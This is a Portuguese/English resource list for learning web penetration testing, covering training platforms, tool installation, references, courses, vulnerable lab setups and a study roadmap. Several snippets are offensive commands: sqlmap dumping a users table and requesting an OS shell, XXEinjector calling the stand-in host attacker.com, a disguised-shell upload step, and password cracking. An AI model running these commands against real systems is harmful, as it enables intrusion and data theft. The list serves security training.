# 🛠️ RESOURCES - Ferramentas, Cursos e Referências

## 🎓 Plataformas de Aprendizado

### Laboratórios Práticos

| Plataforma | Foco | Preço | Recomendação |
|---|---|---|---|
| [HackTheBox](https://www.hackthebox.com) | Web, Sys, Challenges | Freemium | ⭐⭐⭐⭐⭐ |
| [TryHackMe](https://tryhackme.com) | Iniciantes, Guided | Freemium | ⭐⭐⭐⭐⭐ |
| [PortSwigger Academy](https://portswigger.net/web-security) | Web Security | Gratuito | ⭐⭐⭐⭐⭐ |
| [Hack The Box Pro](https://www.hackthebox.com/pricing) | VIP Labs | $20/mês | ⭐⭐⭐⭐ |
| [OWASP WebGoat](https://owasp.org/www-project-webgoat/) | Insegurança intencional | Gratuito | ⭐⭐⭐⭐ |
| [OverTheWire](https://overthewire.org) | Wargames | Gratuito | ⭐⭐⭐⭐ |
| [PicoCTF](https://picoctf.org) | CTF Educational | Gratuito | ⭐⭐⭐⭐ |

---

## 🔨 Ferramentas de Teste (Instalação)

### Essenciais

```bash
# Burp Suite (Web Proxy)
# Download: https://portswigger.net/burp/communitydownload
# Linux: ./burpsuite_community_linux_v2024_x_x.sh

# OWASP ZAP (Open Source Alternative)
sudo apt install zaproxy
zaproxy &

# SQLMap (SQL Injection Testing)
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
python3 sqlmap/sqlmap.py -u "URL" --dbs

# Commix (Command Injection Testing)
git clone https://github.com/commixproject/commix.git
python3 commix/commix.py -u "URL" -p cmd

# dirb (Directory Brute Force)
sudo apt install dirb
dirb http://target.com /usr/share/dirb/wordlists/common.txt

# FFuF (Fast Web Fuzzer)
go get -u github.com/ffuf/ffuf
ffuf -w wordlist.txt -u http://target.com/FUZZ

# Nikto (Web Server Scanner)
sudo apt install nikto
nikto -h http://target.com
```

### Networking & Reconnaissance

```bash
# nmap (Port scanning)
sudo apt install nmap
sudo nmap -sV http://target.com

# gobuster (Directory enumeration)
go install github.com/OJ/gobuster/v3@latest
gobuster dir -u http://target.com -w wordlist.txt

# wget/curl (Data fetching)
wget http://target.com/file.txt
curl -v http://target.com

# whois (Domain info)
whois target.com

# dig/nslookup (DNS)
dig target.com
nslookup target.com
```

---

## 🔐 Ferramentas de Especializadas

### SQL Injection
```bash
sqlmap -u "http://target.com?id=1" --dbs      # Enumerar bancos
sqlmap -u "http://target.com?id=1" -D blog -T users --dump
sqlmap -u "http://target.com?id=1" --os-shell  # OS Shell
```

### XXE Injection
```bash
# XXEinjector
git clone https://github.com/enjoiz/XXEinjector.git
ruby XXEinjector.rb --file file.xml --host attacker.com

# Manual no Burp
# Intruder > Options > Payloads > Paste XXE XML
```

### SSRF/Blind
```bash
# ssrfmap
git clone https://github.com/swisskyrepo/SSRFmap.git
python3 ssrfmap.py -u "http://target.com?url=" -p url

# Burp Collaborator
# Burp > Collaborator > Copy to clipboard
```

### File Upload
```bash
# Polyglot creator
# Jira ImageTragick
# ExifTool

# Manual testing
cp /bin/bash shell.gif
file shell.gif  # GIF image detected
# Upload and execute
```

---

## 📚 Referências Oficiais

### OWASP
- [OWASP Top 10 2024](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/)

### Padrões e Classificação
- [CWE - Common Weakness Enumeration](https://cwe.mitre.org/)
- [CVE - Common Vulnerabilities and Exposures](https://cve.mitre.org/)
- [CVSS - Severity Scoring](https://www.first.org/cvss/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

### Documentação
- [MDN Web Docs](https://developer.mozilla.org/)
- [PortSwigger Web Security](https://portswigger.net/web-security)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [HackTricks](https://book.hacktricks.xyz/)

---

## 🎯 Cursos Recomendados

### Gratuitos
1. **PortSwigger Academy** - Web security fundamentals
2. **OWASP WebGoat** - Hands-on learning
3. **TryHackMe** - Guided exercises
4. **YouTube Channels:**
   - LiveOverflow (Hacking/Security)
   - IppSec (HackTheBox walkthroughs)
   - John Hammond (Security researcher)

### Pagos
1. **Udemy - Web Security Academy** (~$15)
2. **Elearnsecurity - eJPT/eWPT** ($200-400)
3. **Offensive Security - OSCP** ($999)
4. **Certified Ethical Hacker (CEH)** ($400)

---

## 🧪 Laboratórios Locais

### Docker Setup
```bash
# DVWA (Damn Vulnerable Web Application)
docker pull vulnerables/web-dvwa
docker run -it -p 80:80 vulnerables/web-dvwa

# WebGoat
docker pull webgoat/nightly
docker run -p 8080:8080 -p 8081:8081 webgoat/nightly

# Juice Shop (OWASP)
docker pull bkimminich/juice-shop
docker run -p 3000:3000 bkimminich/juice-shop
```

### Vagrant
```bash
# Metasploitable (VM vulnerável)
vagrant init rapid7/metasploitable3-ub1404
vagrant up
```

---

## 📱 Mobile Security

| Tool | Uso |
|---|---|
| Frida | Dynamic instrumentation |
| MobSF | Mobile analysis |
| Jadx | Decompile Android |
| Hopper | Binary analysis |

---

## ☁️ Cloud Security

### AWS
```bash
# AWS CLI
aws s3 ls  # List buckets
aws s3 sync s3://bucket /local/path  # Download

# CloudMapper
git clone https://github.com/duo-labs/cloudmapper.git

# ScoutSuite
pip install scoutsuite
scout --provider aws
```

### Azure & GCP
```bash
# Azure CLI
az storage account list

# GCP SDK
gcloud compute instances list
```

---

## 🔍 Reconnaissance Tools

### Passive
```bash
# Shodan
https://shodan.io  # Search engine for Internet things

# Google Dorks
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com "password"

# DNS Recon
whois target.com
dig target.com +short
nslookup -type=MX target.com
```

### Active
```bash
# Nmap
sudo nmap -A target.com

# Metasploit
msfconsole
> search target_software
```

---

## 📊 Vulnerability Databases

| Database | Tipo | Link |
|---|---|---|
| CVE | Official | https://cve.mitre.org |
| NVD | Official | https://nvd.nist.gov |
| ExploitDB | Exploits | https://exploitdb.com |
| Metasploit | Exploits | https://www.metasploit.com |
| Rapid7 | Vulnerability data | https://www.rapid7.com |

---

## 🛡️ Defensive Tools

### SIEM
- **Splunk** - Enterprise SIEM
- **ELK Stack** - Open source (Elasticsearch, Logstash, Kibana)
- **Datadog** - Cloud monitoring

### WAF
- **ModSecurity** - Open source WAF
- **AWS WAF** - Cloud WAF
- **Cloudflare WAF** - Edge WAF

### DAST
- **Burp Suite** - Interactive testing
- **OWASP ZAP** - Automated scanning
- **Acunetix** - Vulnerability scanner

### SAST
- **SonarQube** - Code analysis
- **Checkmarx** - Source code scanner
- **Fortify** - Static analysis

---

## 🔐 Cryptography Tools

```bash
# OpenSSL
openssl s_client -connect target.com:443

# hashcat (Password cracking)
hashcat -m 0 hashes.txt wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt hashes.txt

# Cryptool
https://www.cryptool.org/
```

---

## 🎓 Certificações Relacionadas

| Certificação | Fornecedor | Nível |
|---|---|---|
| CEH | EC-Council | Intermediário |
| OSCP | Offensive Security | Avançado |
| GWAPT | GIAC | Avançado |
| eJPT | Elearnsecurity | Iniciante |
| eWPT | Elearnsecurity | Intermediário |
| GPEN | GIAC | Avançado |

---

## 🌐 Comunidades & Fóruns

- [HackTheBox Forums](https://forum.hackthebox.com)
- [Reddit r/netsec](https://reddit.com/r/netsec)
- [Reddit r/cybersecurity](https://reddit.com/r/cybersecurity)
- [OWASP Community](https://owasp.org/www-community)
- [Security Stack Exchange](https://security.stackexchange.com)

---

## 📺 YouTube Channels

1. **LiveOverflow** - Deep technical content
2. **IppSec** - HackTheBox walkthroughs
3. **John Hammond** - Security topics
4. **NetworkChuck** - Networking & Security
5. **Professsor Messer** - CompTIA Security+

---

## 🚀 Getting Started Roadmap

```
Semana 1-2: Fundamentos
└─ HTTP/HTTPS, HTML, JavaScript basics

Semana 3-4: SQL & Databases
└─ SQL basics, SQL Injection intro

Semana 5-6: XSS & CSRF
└─ DOM, JavaScript injection, CSRF tokens

Semana 7-8: Web Framework Security
└─ MVC, Authentication, Session management

Semana 9-10: Advanced Topics
└─ SSRF, XXE, API Security

Semana 11-12: Capstone Project
└─ Teste aplicação completa
```

---

## 💡 Pro Tips

1. **Always use VPN** para testes
2. **Document everything** - Capturas, outputs, timestamps
3. **Use version control** - Git para scripts e notas
4. **Automate repetitive tasks** - Python scripts
5. **Keep learning** - Vulnerabilidades mudam constantemente
6. **Join CTFs** - TryHackMe, HackTheBox, OverTheWire
7. **Read source code** - GitHub projects
8. **Follow security blogs** - Krebs on Security, Ars Technica

---

**Última atualização:** Agosto 2026

**Sugestões?** Abra uma issue ou contribua!
